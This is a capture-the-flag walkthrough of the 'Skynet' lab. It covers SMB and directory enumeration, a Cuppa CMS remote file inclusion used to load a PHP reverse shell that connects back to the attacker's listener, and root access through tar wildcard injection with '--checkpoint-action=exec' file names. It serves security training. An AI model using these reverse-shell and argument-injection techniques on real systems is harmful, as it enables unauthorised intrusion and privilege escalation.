# Skynet

```
nmap 10.10.11.149
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 21-50-52.png>)

### **What is Miles password for his emails?**

```bash
smbclient -N -L //10.10.11.149
smbclient -N //10.10.11.149/anonymous
smb: \> get logs\log1.txt
smb: \> exit
cat log1.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 21-52-45.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-27-12.png>)

```
gobuster dir -u http://10.10.11.149/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-28-31.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-24-29.png>)

### **What is the hidden directory?**

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-29-18.png>)

```bash
smbclient //10.10.11.149/milesdyson -U milesdyson
smb: \> get notes\important.txt
smb: \> exit
cat important.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-32-02.png>)

### **What is the vulnerability called when you can include a remote file for malicious purposes?**

{% hint style="success" %}
remote file inclusion
{% endhint %}

### What is the user flag?

```
gobuster dir -u http://10.10.11.149/45kra24zxs28v3yd/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-44-58.png>)

```
searchsploit -w cuppa 
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 22-56-26.png>)

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
vim php-reverse-shell.php
# $ip = '10.9.101.193';
# $port = 4444;
sudo python3 -m http.server 80
```

```
nc -nvlp 4444
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ cat /home/milesdyson/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 23-03-24.png>)

### **What is the root flag?**

```
cat /etc/crontab
cat /home/milesdyson/backups/backup.sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 23-40-46.png>)

```bash
touch '/var/www/html/--checkpoint=1'
touch '/var/www/html/--checkpoint-action=exec=sh shell.sh'
echo -e '#/bin/bash\ncat /root/root.txt > /tmp/root.txt' > /var/www/html/shell.sh
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 23-41-56.png>)

```bash
cat /tmp/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-14 23-41-56 (copy).png>)

## :link: Support Material

{% embed url="https://www.exploit-db.com/exploits/25971" %}

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}

{% embed url="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" %}

